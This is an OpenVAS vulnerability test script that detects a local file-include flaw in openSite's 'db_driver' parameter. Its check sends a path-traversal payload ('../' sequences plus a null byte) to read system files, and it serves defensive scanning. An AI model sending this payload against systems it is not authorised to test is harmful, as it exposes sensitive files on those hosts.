###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_open_site_45709.nasl 12240 2018-11-07 09:03:47Z cfischer $
#
# Primal Fusion openSite 'db_driver' Parameter Multiple Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:primalfusion:opensite";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103022");
  script_version("$Revision: 12240 $");
  script_tag(name:"last_modification", value:"$Date: 2018-11-07 10:03:47 +0100 (Wed, 07 Nov 2018) $");
  script_tag(name:"creation_date", value:"2011-01-10 13:28:19 +0100 (Mon, 10 Jan 2011)");
  script_bugtraq_id(45709);
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_name("Primal Fusion openSite 'db_driver' Parameter Multiple Local File Include Vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("gb_open_site_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("primalfusion/opensite/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45709");
  script_xref(name:"URL", value:"http://sourceforge.net/projects/contentone/");

  script_tag(name:"summary", value:"openSite is prone to multiple local file-include vulnerabilities
  because it fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit these vulnerabilities to obtain
  potentially sensitive information and to execute arbitrary local scripts in the context of the
  webserver process. This may allow the attacker to compromise the application and the computer. Other
  attacks are also possible.");

  script_tag(name:"affected", value:"openSite 0.2.2-beta is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit(0);

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

files = traversal_files();

foreach pattern( keys( files ) ) {

  file = files[pattern];

  url = dir + "/src/content.php?db_driver=" + crap( data:"../", length:3*9 ) + file + "%00";

  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 0 );